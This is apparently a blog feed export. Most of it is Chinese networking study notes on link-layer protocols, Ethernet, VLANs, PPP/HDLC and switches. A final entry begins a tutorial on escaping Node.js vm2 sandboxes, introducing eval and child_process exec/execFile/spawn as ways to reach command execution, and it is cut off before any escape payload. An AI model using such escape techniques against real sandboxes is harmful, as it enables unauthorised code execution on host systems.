class="headerlink" title="TDM"></a>TDM</h3><p><strong>时分多路复用</strong></p><p>将时间划分为一段段等长的时分复用帧(TDM帧)。每一个时分复用的用户在每一个TDM帧中占用固定序号的时隙，所有用户轮流占用信道。可以提高信道利用率。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331224352471.png" alt="image-20240331224352471"></p><p><strong>统计时分复用STDM</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331224551762.png" alt="image-20240331224551762"></p><h3 id="WDM"><a href="#WDM" class="headerlink" title="WDM"></a>WDM</h3><p><strong>波分多路复用</strong></p><p>波分多路复用就是光的频分多路复用，在一根光纤中传输多种不同波长(频率)的光信号，由于波长(频率)不同，所以各路光信号互不干扰，最后再用波长分解复用器将各路波长分解出来。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331224810520.png" alt="image-20240331224810520"></p><h3 id="CDM"><a href="#CDM" class="headerlink" title="CDM"></a>CDM</h3><p><strong>码分多路复用</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331225152377.png" alt="image-20240331225152377"></p><h2 id="随机访问介质访问控制"><a href="#随机访问介质访问控制" class="headerlink" title="随机访问介质访问控制"></a>随机访问介质访问控制</h2><p>所有用户可随机发送信息，发送信息时占全部带宽。</p><h3 id="ALOHA协议"><a href="#ALOHA协议" class="headerlink" title="ALOHA协议"></a>ALOHA协议</h3><p>该协议分为两种：</p><ol><li>纯ALOHA协议</li><li>时隙ALOHA协议</li></ol><p><strong>纯ALOHA协议</strong></p><p>不监听信道，不按时间槽发送，随机重发。想发就发</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331225826465.png" alt="image-20240331225826465"></p><ul><li>冲突检测：如果发生冲突，接收方在就会检测出差错然后不予确认，发送方在一定时间内收不到就判断发生冲突。</li><li>冲突如何解决：超时后等一随机时间再重传。</li></ul><p><strong>时隙ALOHA协议</strong></p><p>时隙ALOHA协议的思想：把时间分成若干个相同的时间片，所有用户在时间片开始时刻同步接入网络信道若发生冲突，则必须等到下一个时间片开始时刻再发送。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331230108274.png" alt="image-20240331230108274"></p><ol><li>纯ALOHA比时隙ALOHA吞吐量更低，效率更低。</li><li>纯ALOHA想发就发，时隙ALOHA只有在时间片段开始时才能发。</li></ol><h3 id="CSMA协议"><a href="#CSMA协议" class="headerlink" title="CSMA协议"></a>CSMA协议</h3><p>即叫做载波监听多路访问协议CSMA(carrier sense multiple access)</p><ul><li><p><strong>CS</strong>：载波侦听&#x2F;监听，每一个站在发送数据之前要检测一下总线上是否有其他计算机在发送数据。</p><blockquote><p>当几个站同时在总线上发送数据时，总线上的信号电压摆动值将会增大(互相叠加)。当一个站检测到的信号电压摆动值超过一定门限值时，就认为总线上至少有两个站同时在发送数据，表明产生了碰撞，即发生了冲突。</p></blockquote></li><li><p><strong>MA</strong>：多点接入，表示许多计算机以多点接入的方式连接在一根总线上。</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331232412543.png" alt="image-20240331232412543"></p><ol><li><p><strong>1-坚持CSMA</strong>：</p><p>如果一个主机要发送消息，那么它先监听信道。<br>空闲则直接传输，不必等待。<br>忙则一直监听，直到空闲马上传输。<br>如果有冲突(一段时间内未收到肯定回复)，则等待一个随机长的时间再监听，重复上述过程。</p><p>优点：只要媒体空闲，站点就马上发送，避免了媒体利用率的损失。<br>缺点：假如有两个或两个以上的站点有数据要发送，冲突就不可避免。</p></li><li><p><strong>非坚持CSMA</strong>：</p><p>如果一个主机要发送消息，那么它先监听信道空闲则直接传输，不必等待。忙则等待一个随机的时间之后再进行监听。</p><p>优点：采用随机的重发延迟时间可以减少冲突发生的可能性。</p><p>缺点：可能存在大家都在延迟等待过程中，使得媒体仍可能处于空闲状态，媒体使用率降低</p></li><li><p><strong>p-坚持CSMA协议</strong>：p-坚持指的是对于监听信道空闲的处理</p><p>如果一个主机要发送消息，那么它先监听信道</p><p>空闲则以p概率直接传输，不必等待；概率1-p等待到下一个时间槽再传输。</p><p>忙则持续监听直到信道空闲再以p概率发送。</p><p>若冲突则等到下一个时间槽开始再监听并重复上述过程。</p><p>优点：既能像非坚持算法那样减少冲突，又能像1-坚持算法那样减少媒体空闲时间的这种方案</p><p>缺点：发生冲突后还是要坚持把数据帧发送完，造成了浪费。</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331233405613.png" alt="image-20240331233405613"></p><h3 id="CSMA-CD协议"><a href="#CSMA-CD协议" class="headerlink" title="CSMA&#x2F;CD协议"></a>CSMA&#x2F;CD协议</h3><p>载波监听多点接入&#x2F;碰撞检测CSMA&#x2F;CD(carrier sense multiple access with collision detection)</p><ul><li><strong>CS</strong>：载波侦听&#x2F;监听，每一个站在发送数据之前以及发送数据时都要检测一下总线上是否有其他计算机在发送数据。和上面的相比多了一个发送时监听。</li><li><strong>MA</strong>：多点接入，表示许多计算机以多点接入的方式连接在一根总线上。总线型网络。</li><li><strong>CD</strong>：碰撞检测(冲突检测)，“边发送边监听，适配器边发送数据边检测信道上信号电压的变化情况，以便判断自己在发送数据时其他站是否也在发送数据。说明用于半双工网络。</li></ul><p><strong>传播时延对载波监听的影响</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331234826159.png" alt="image-20240331234826159"></p><p><strong>碰撞后的重传机制</strong></p><p>使用截断二进制指数规避算法</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331235336764.png" alt="image-20240331235336764"></p><p><strong>最小帧长问题</strong></p><p>因为该协议就是为了即使控制帧的传输，如果帧已经发完了就没有控制的意义了，所以会规定一个最小帧长以便在帧发送完之前可以检测到冲突并及时控制传输。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331235646524.png" alt="image-20240331235646524"></p><blockquote><p>以太网规定的最短帧长为64B，所以长度小于64B的都是由于冲突而异常终止的无效帧。</p></blockquote><h3 id="CDMA-CA协议"><a href="#CDMA-CA协议" class="headerlink" title="CDMA&#x2F;CA协议"></a>CDMA&#x2F;CA协议</h3><p>载波监听多点接入&#x2F;碰撞避免CSMA&#x2F;CA(carrier sense multiple access with collision avoidance)</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401000102318.png" alt="image-20240401000102318"></p><p><strong>工作原理</strong></p><ol><li>发送数据前，先检测信道是否空闲</li><li>空闲则发出RTS(request to send)，RTS包括发射端的地址、接收端的地址、下一份数据将持续发送的时间等信息;信道忙则等待。</li><li>接收端收到RTS后，将响应CTS(clear tosend)</li><li>发送端收到CTS后，开始发送数据帧(同时预约信道:发送方告知其他站点自己要传多久数据)。</li><li>接收端收到数据帧后，将用CRC来检验数据是否正确，正确则响应ACK帧。</li><li>发送方收到ACK就可以进行下一个数据帧的发送，若没有则一直重传至规定重发次数为止(采用二进制指数退避算法来确定随机的推迟时间)。</li></ol><blockquote><p>RTS&#x2F;CTS是可选的的，主要用于解决隐蔽站的问题，但是一定要成对出现。</p></blockquote><h3 id="CD和CA的对比"><a href="#CD和CA的对比" class="headerlink" title="CD和CA的对比"></a>CD和CA的对比</h3><p><strong>相同点：</strong><br>CSMA&#x2F;CD与CSMA&#x2F;CA机制都从属于CSMA的思路，其核心是先听再说。换言之，两个在接入信道之前都须要进行监听。当发现信道空闲后，才能进行接入。<br><strong>不同点：</strong></p><ol><li>传输介质不同:CSMA&#x2F;CD用于总线式以太网【有线】，而CSMACA用于无线局域网【无线】</li><li>载波检测方式不同:因传输介质不同，CSMA&#x2F;CD与CSMA&#x2F;CA的检测方式也不同。CSMA&#x2F;CD通过电缆中电压的变化来检测，当数据发生碰撞时，电缆中的电压就会随着发生变化；而CSMA&#x2F;CA采用能量检测(ED)、载波检测(CS)和能量载波混合检测三种检测信道空闲的方式。</li><li>CSMA&#x2F;CD检测冲突，CSMA&#x2F;CA避免冲突，二者出现冲突后都会进行有上限的重传。</li></ol><h2 id="轮询访问介质访问控制"><a href="#轮询访问介质访问控制" class="headerlink" title="轮询访问介质访问控制"></a>轮询访问介质访问控制</h2><h3 id="轮询协议"><a href="#轮询协议" class="headerlink" title="轮询协议"></a>轮询协议</h3><p>主结点轮流”邀请”从属结点发送数据，也就是轮询发送一个短的询问帧看从属结点是否要发送数据</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401002015624.png" alt="image-20240401002015624"></p><p>不过会带来一些问题：</p><ol><li>轮询开销</li><li>等待延迟</li><li>单点故障</li></ol><h3 id="令牌传递协议"><a href="#令牌传递协议" class="headerlink" title="令牌传递协议"></a>令牌传递协议</h3><p><strong>令牌</strong>：一个特殊格式的MAC控制帧，不含任何协议</p><p>令牌用于控制信道的使用，确保同一时刻只有一个结点独占信道。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401002623143.png" alt="image-20240401002623143"></p><blockquote><p>工作流程大概如下：</p><p>假设D要给A发送数据，D持有令牌之后修改控制帧表示已经使用，然后在令牌后面带上数据构成数据帧，然后该数据帧就在令牌环中进行传递，当传到主机A的时候发现是发送给自己的就复制这一份数据，然后令牌传给D；D再检查自己的数据有没有出现问题需不需要重传，确认完毕之后就回收数据，再还原令牌的控制帧然后将令牌继续传递。</p></blockquote><p>每个结点都可以在一定时间内(令牌持有时间)获得发送数据的权利，并不是无限制的持有令牌；如果发送数据过大在一个令牌时间内无法发送完就需要分次发送，等待下一次令牌传递。</p><p><strong>该协议也会产生一些问题</strong></p><ol><li>令牌开销</li><li>等待延迟</li><li>单点故障</li></ol><blockquote><p>该协议应用于令牌环网（物理星型拓扑，逻辑环形拓扑）</p><p>该方式常用于负载较重、通信量较大的网络中，因为如果较为空闲的网络中，令牌可能会一直传递但没有使用造成浪费。</p></blockquote><h1 id="局域网"><a href="#局域网" class="headerlink" title="局域网"></a>局域网</h1><p>局域网(Local Area Network):简称LAN，是指在某一区域内由多台计算机互联成的计算机组，使用广播信道</p><ul><li>特点1:覆盖的地理范围较小，只在一个相对独立的局部范围内联，如一座或集中的建筑群内。</li><li>特点2:1使用专门铺设的传输介质(双绞线、同轴电缆)进行联网，数据传输速率高(10Mb&#x2F;s~10Gb&#x2F;s)</li><li>特点3:通信延迟时间短，误码率低，可靠性较高。</li><li>特点4:各站为平等关系，共享传输信道。</li><li>特点5:多采用分布式控制和广播式通信，能进行广播和组播，</li></ul><p>决定局域网的主要要素为：网络拓扑、传输介质和介质访问控制方法</p><h2 id="局域网拓扑结构"><a href="#局域网拓扑结构" class="headerlink" title="局域网拓扑结构"></a>局域网拓扑结构</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401215100579.png" alt="image-20240401215100579"></p><p>综上可以知道总线型的拓扑结构是比较好的，现在比较常用的也是总线型拓扑。</p><h2 id="局域网传输介质"><a href="#局域网传输介质" class="headerlink" title="局域网传输介质"></a>局域网传输介质</h2><ul><li>有线局域网：双绞线、同轴电缆、光纤</li><li>无线局域网：电磁波</li></ul><h2 id="局域网介质访问控制方法"><a href="#局域网介质访问控制方法" class="headerlink" title="局域网介质访问控制方法"></a>局域网介质访问控制方法</h2><ol><li><p>CSMA&#x2F;CD：常用于总线型局域网，也用于树型网络</p></li><li><p>令牌总线：常用于总线型局域网，也用于树型网络</p><p>它是把总线型或树型网络中的各个工作站按一定顺序如按接口地址大小排列形成一个逻辑环。只有令牌持有者才能控制总线，才有发送信息的权力。</p></li><li><p>令牌环：用于环形局域网，如令牌环网</p></li></ol><h2 id="局域网的分类"><a href="#局域网的分类" class="headerlink" title="局域网的分类"></a>局域网的分类</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401215625251.png" alt="image-20240401215625251"></p><h2 id="IEEE-802标准"><a href="#IEEE-802标准" class="headerlink" title="IEEE 802标准"></a>IEEE 802标准</h2><p>IEEE 802系列标准是IEEE 802 LAN&#x2F;MAN 标准委员会制定的局域网、城域网技术标准(1980年2月成立)。其中最广泛使用的有以太网、令牌环、无线局域网等。这一系列标准中的每一个子标准都由委员会中的一个专门工作组负责。</p><p><strong>下面是一些802的版本</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401215941515.png" alt="image-20240401215941515"></p><h2 id="MAC子层和LLC子层"><a href="#MAC子层和LLC子层" class="headerlink" title="MAC子层和LLC子层"></a>MAC子层和LLC子层</h2><p>IEEE802标准所描述的局域网参考模型只对应OSI参考模型的数据链路层与物理层，它将数据链路层划分为逻辑链路层LLC子层和介质访问控制MAC子层。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401220205402.png" alt="image-20240401220205402"></p><h1 id="以太网"><a href="#以太网" class="headerlink" title="以太网"></a>以太网</h1><p>以太网(Ethernet)指的是由Xerox公司创建并由Xerox、Intel和DEC公司联合开发的基带总线局域网规范，是当今现有局域网采用的最通用的通信协议标准。以太网络使用CSMA&#x2F;CD(载波监听多路访问及冲突检测)技术。</p><p><strong>以太网十分常用的原因</strong></p><ol><li>造价低廉</li><li>是应用最广泛的局域网技术</li><li>比令牌环网、ATM网便宜，简单</li><li>满足网络速率要求：10Mb&#x2F;s~10Gb&#x2F;s</li></ol><p><strong>以太网的两个标准</strong></p><ul><li>DIX Ethernet V2:第一个局域网产品(以太网)规约。</li><li>IEEE 802.3:IEEE 802委员会802.3工作组制定的第一个IEEE的以太网标准。(帧格式有一丢丢改动)</li></ul><h2 id="以太网提供无连接、不可靠的服务"><a href="#以太网提供无连接、不可靠的服务" class="headerlink" title="以太网提供无连接、不可靠的服务"></a>以太网提供无连接、不可靠的服务</h2><p>无连接：发送方和接收方之间无””握手过程”<br>不可靠：不对发送方的数据帧编号，接收方不向发送方进行确认，差错帧直接丢弃，差错纠正由高层负责。</p><blockquote><p>以太网只实现无差错接收，不实行可靠传输</p></blockquote><h2 id="以太网传输介质和拓扑结构发展"><a href="#以太网传输介质和拓扑结构发展" class="headerlink" title="以太网传输介质和拓扑结构发展"></a>以太网传输介质和拓扑结构发展</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401221233925.png" alt="image-20240401221233925"></p><h2 id="10BASE-T以太网"><a href="#10BASE-T以太网" class="headerlink" title="10BASE-T以太网"></a>10BASE-T以太网</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401221436733.png" alt="image-20240401221436733"></p><h2 id="适配器与MAC地址"><a href="#适配器与MAC地址" class="headerlink" title="适配器与MAC地址"></a>适配器与MAC地址</h2><p>计算机与外界有局域网的连接是通过通信适配器的。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401221549243.png" alt="image-20240401221549243"></p><p>MAC地址又称为物理地址，是全球唯一的，每个网卡都有MAC地址。</p><p>MAC地址是由48位二进制数组成，前24位代表厂家(由IEEE规定)，后24位厂家自己指定。常用6个十六进制数表示，如02-60-8e-e4-b1-21</p><h2 id="以太网MAC帧"><a href="#以太网MAC帧" class="headerlink" title="以太网MAC帧"></a>以太网MAC帧</h2><p>最常用的MAC帧是以太网V2的格式</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401222333972.png" alt="image-20240401222333972"></p><blockquote><p>以太网的最小帧长位64B</p></blockquote><p>与IEEE 802.3的区别：</p><ol><li>第三个字段是长度&#x2F;类型</li><li>当长度&#x2F;类型字段值小于0x0600时，数据字段必须装入LLC子层</li></ol><h2 id="高速以太网"><a href="#高速以太网" class="headerlink" title="高速以太网"></a>高速以太网</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401222630966.png" alt="image-20240401222630966"></p><h1 id="无线局域网"><a href="#无线局域网" class="headerlink" title="无线局域网"></a>无线局域网</h1><p>IEEE 802.11是无线局域网的通用标准。</p><p>它还有很多细分的版本如下：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401222817167.png" alt="image-20240401222817167"></p><h2 id="802-11的MAC帧头格式"><a href="#802-11的MAC帧头格式" class="headerlink" title="802.11的MAC帧头格式"></a>802.11的MAC帧头格式</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401223149510.png" alt="image-20240401223149510"></p><p>上面的只是其中一种，802.11不同的版本还有不同的帧头格式</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401223240972.png" alt="image-20240401223240972"></p><h2 id="无线局域网分类"><a href="#无线局域网分类" class="headerlink" title="无线局域网分类"></a>无线局域网分类</h2><p><strong>有固定基础设施的无线局域网</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401223632641.png" alt="image-20240401223632641"></p><p>wifi的名称又叫做服务集标识符。</p><p><strong>无固定基础设施无线局域网的自组织网络</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401223748731.png" alt="image-20240401223748731"></p><p>即每个主机又可以当作主机又可以当作路由器转发数据。</p><h1 id="VLAN"><a href="#VLAN" class="headerlink" title="VLAN"></a>VLAN</h1><p>就是虚拟局域网(Virtual Local Area Network)，是一种将局域网的设备划分成与物理位置无关的逻辑组的技术，这些逻辑组有某些共同的需求。每个VLAN是一个单独的广播域&#x2F;不同的子网。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401224352375.png" alt="image-20240401224352375"></p><blockquote><p>虚拟网络建立在网络交换机之上，它以软件方式来实现逻辑工作组的划分与管理</p></blockquote><h2 id="VLAN的实现"><a href="#VLAN的实现" class="headerlink" title="VLAN的实现"></a>VLAN的实现</h2><p>交换机上生成的VLAN互不想通，若想实现通信，需要借助：</p><ul><li>路由器</li><li>三层交换机</li></ul><p><strong>基于接口的VLAN技术</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401225024038.png" alt="image-20240401225024038"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401225037903.png" alt="image-20240401225037903"></p><p>A发送一个广播帧可以不让B收到，其原理如下：</p><blockquote><p>A发送一个广播请求，交换机取转发表中对照知道他是来自1号端口，知道他是来自VLAN1的广播请求，然后却交换机的VLAN表中查看，VLAN ID中为1的只有2号端口所以会转发给B而不会转发给C和D</p></blockquote><p><strong>基于MAC地址的VLAN技术</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401225544853.png" alt="image-20240401225544853"></p><p>就是改变了一下交换机的VLAN表的形式，对应还是一样的。</p><p><strong>交换机之间的通信</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401225719073.png" alt="image-20240401225719073"></p><p>比如A要给E发送数据，然后给数据标记上VLAN1的标签，当发送到交换机2的时候就知道它是属于哪一个网络的，然后就可以发送给E了。</p><p><strong>IEEE 802.1Q帧</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401230123145.png" alt="image-20240401230123145"></p><h1 id="广域网及相关协议"><a href="#广域网及相关协议" class="headerlink" title="广域网及相关协议"></a>广域网及相关协议</h1><p>广域网(WAN，WideArea Network)，通常跨接很大的物理范围，所覆盖的范围从几十公里到几千公里，它能连接多个城市或国家，或横跨几个洲并能提供远距离通信，形成国际性的远程网络。</p><p>广域网的通信子网主要使用分组交换技术。广域网的通信子网可以利用公用分组交换网、卫星通信网和无线分组交换网，它将分布在不同地区的局域网或计算机系统互连起来，达到资源共享的目的。如因特网(Internet)是世界范围内最大的广域网。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401230819221.png" alt="image-20240401230819221"></p><h2 id="PPP协议"><a href="#PPP协议" class="headerlink" title="PPP协议"></a>PPP协议</h2><p>点对点协议PPP(Point-to-Point Protocol)是目前使用最广泛的数据链路层协议，用户使用拨号电话接入因特网时一般都使用PPP协议。</p><blockquote><p>该协议只支持全双工通信</p></blockquote><p><strong>PPP协议应满足的要求</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401231218835.png" alt="image-20240401231218835"></p><p><strong>PPP协议无需满足的要求</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401231255188.png" alt="image-20240401231255188"></p><p><strong>PPP协议的三个组成部分</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401231415652.png" alt="image-20240401231415652"></p><p><strong>PPP协议的状态图</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401231530196.png" alt="image-20240401231530196"></p><p><strong>PPP协议的帧格式</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401231652471.png" alt="image-20240401231652471"></p><blockquote><p>PPP协议是一个面向字节的协议</p></blockquote><h2 id="HDLC协议"><a href="#HDLC协议" class="headerlink" title="HDLC协议"></a>HDLC协议</h2><p>高级数据链路控制(High-Level Data Link ControI或简称HDLC)，是一个在同步网上传输数据、面向比特的数据链路层协议，它是由国际标准化组织(ISO)根据IBM公司的SDLC(SvnchronousData Link Control)协议扩展开发而成的。</p><p>数据报文可透明传输，用于实现透明传输的“0比特插入法”易于硬件实现</p><p>HDLC协议采用全双工通信。</p><p>所有帧采用CRC检验，对信息帧进行顺序编码，可防止漏收或重份，传输可靠性高。</p><p><strong>HDLC的站</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401232456669.png" alt="image-20240401232456669"></p><p><strong>HDLC的帧格式</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401232617385.png" alt="image-20240401232617385"></p><h2 id="PPP协议和HDLC协议的区别"><a href="#PPP协议和HDLC协议的区别" class="headerlink" title="PPP协议和HDLC协议的区别"></a>PPP协议和HDLC协议的区别</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401232742381.png" alt="image-20240401232742381"></p><h1 id="链路层设备"><a href="#链路层设备" class="headerlink" title="链路层设备"></a>链路层设备</h1><h2 id="物理层扩展以太网"><a href="#物理层扩展以太网" class="headerlink" title="物理层扩展以太网"></a>物理层扩展以太网</h2><p>用来减少信号的衰减，因为一台主机连上集线器的端口之后距离不能太远，不然信号失真非常严重</p><ol><li><p>使用光纤解调器来扩展以太网</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401233116459.png" alt="image-20240401233116459"></p></li><li><p>划分多个冲突域来扩展，冲突域就是一个冲突域内只能有一台主机和集线器连接，不然就会发生冲突</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401233239090.png" alt="image-20240401233239090"></p><p>但是该方式的冲突效率降低了</p></li></ol><h2 id="链路层扩展以太网"><a href="#链路层扩展以太网" class="headerlink" title="链路层扩展以太网"></a>链路层扩展以太网</h2><p>一般使用网桥或者交换机</p><p><strong>网桥</strong></p><p>网桥根据MAC帧的目的地址对帧进行转发和过滤。当网桥收到一个帧时，并不向所有接口转发此帧，而是先检查此帧的目的MAC地址，然后再确定将该帧转发到哪一个接口，或者是把它丢弃(即过滤)。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401234933353.png" alt="image-20240401234933353"></p><p>网桥又分为两种：</p><ul><li><p>透明网桥：“透明”指以太网上的站点并不知道所发送的帧将经过哪几个网桥，是一种即插即用设备-自学习</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401235353540.png" alt="image-20240401235353540"></p><p>自学习指的就是会在数据发送的过程中逐渐填充转发表。</p></li><li><p>源路由网桥：在发送帧时，把详细的最佳路由信息(路由最少&#x2F;时间最短)放在帧的首部中。</p><p><strong>方法</strong>：源站以广播方式向欲通信的目的站发送一个发现帧</p></li></ul><p><strong>以太网交换机</strong></p><p>也叫做多接口网桥，一个交换机上有很多个端口，每一个端口都是一个冲突域。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401235818631.png" alt="image-20240401235818631"></p><p><strong>以太网交换机的两种交换方式</strong></p><ul><li><p>直通式交换机：查完目的地址(6B)就立刻转发。</p><p>延迟小，可靠性低，无法支持具有不同速率的端口的交换。</p></li><li><p>存储转发式交换机：将帧放入高速缓存，并检查否正确，正确则转发，错误则丢弃。<br>延迟大，可靠性高，可以支持具有不同速率的端口的交换。</p></li></ul><p><strong>交换机的自学习</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240402000240493.png" alt="image-20240402000240493"></p><h2 id="冲突域和广播域"><a href="#冲突域和广播域" class="headerlink" title="冲突域和广播域"></a>冲突域和广播域</h2><p><strong>冲突域</strong></p><p>在同一个冲突域中的每一个节点都能收到所有被发送的帧；简单的说就是同一时间内只能有一台设备发送信息的范围。</p><p><strong>广播域</strong></p><p>网络中能接收任一设备发出的广播帧的所有设备的集合。简单的说如果站点发出一个广播信号，所有能接收收到这个信号的设备范围称为一个广播域。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240402000502481.png" alt="image-20240402000502481"></p>]]></content>
      
      
      <categories>
          
          <category> 基础,计网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vm2沙箱逃逸</title>
      <link href="/2024/03/09/vm2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
      <url>/2024/03/09/vm2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<!-- toc --><h1 id="沙箱逃逸的概念"><a href="#沙箱逃逸的概念" class="headerlink" title="沙箱逃逸的概念"></a>沙箱逃逸的概念</h1><ul><li>沙箱(sandbox)就是创建一个单独的运行代码的环境，和主机进行隔离，这样代码产生的危害就不会影响到主机，沙箱的工作机制主要是依靠重定向，将恶意代码的执行目标重定向到沙箱内部。</li><li>沙箱（sandbox）和 虚拟机（VM）和 容器（Docker）之间的区别：sandbox和VM使用的都是虚拟化技术，但二者间使用的目的不一样。沙箱用来隔离有害程序，而虚拟机则实现了我们在一台电脑上使用多个操作系统的功能。Docker属于sandbox的一种，通过创造一个有边界的运行环境将程序放在里面，使程序被边界困住，从而使程序与程序，程序与主机之间相互隔离开。在实际防护时，使用Docker和sandbox嵌套的方式更多一点，安全性也更高。</li><li>Nodejs中，通过vm模块来创建一个沙箱，但vm模块的漏洞较大，后续就出现了升级版的vm2，对vm做了优化，但是在旧版本仍然存在一些漏洞。</li></ul><p>那么沙箱逃逸就是字面意思，逃离该沙箱环境对主机进行影响，比如rce等。</p><h1 id="Nodejs命令执行"><a href="#Nodejs命令执行" class="headerlink" title="Nodejs命令执行"></a>Nodejs命令执行</h1><p>要进行rce就要先了解一下Nodejs的执行命令的一些模块和函数。</p><p>参考文章：<a href="https://www.w3cschool.cn/nwfchn/omcvtozt.html">https://www.w3cschool.cn/nwfchn/omcvtozt.html</a></p><ul><li><p>eval()：这个函数跟php的效果一样，也是直接将字符串当作代码执行。</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;console.log(&quot;hello&quot;)&#x27;</span>);<br></code></pre></td></tr></table></figure></li><li><p>child_process模块：该模块就是nodejs用来执行命令的模块</p><ul><li><p>exec()：该方法用来执行bash命令</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> exec=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-property">exec</span>;<br><span class="hljs-keyword">var</span> whoami=<span class="hljs-title function_">exec</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">error, stdout, stderr</span>)&#123;<br>    <span class="hljs-keyword">if</span>(error)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(error.<span class="hljs-property">stack</span>);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Error code: &#x27;</span>+error.<span class="hljs-property">code</span>);<br>    &#125;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Child Process STDOUT: &#x27;</span>+stdout);<br>&#125;);<br><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;console.log(&quot;hello&quot;)&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309144449923.png" alt="image-20240309144449923"></p><p>exec方法的第一个参数是所要执行的shell命令，第二个参数是回调函数，该函数接受三个参数，分别是发生的错误、标准输出的显示结果、标准错误的显示结果。</p></li><li><p>execFile()：该方法直接执行特定的程序，参数作为数组传入，不会被bash解释，因此具有较高的安全性。</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> execFile=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-property">execFile</span>;<br><span class="hljs-title function_">execFile</span>(<span class="hljs-string">&#x27;/bin/ls&#x27;</span>,[<span class="hljs-string">&#x27;-l&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>],<span class="hljs-keyword">function</span>(<span class="hljs-params">error,result</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result);<br>&#125;)<br></code></pre></td></tr></table></figure></li><li><p>spawn()：spawn方法创建一个子进程来执行特定命令，用法与execFile方法类似，但是没有回调函数，只能通过监听事件，来获取运行结果。它属于异步执行，适用于子进程长时间运行的情况。</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs JS"><span class="hljs-keyword">var</span> 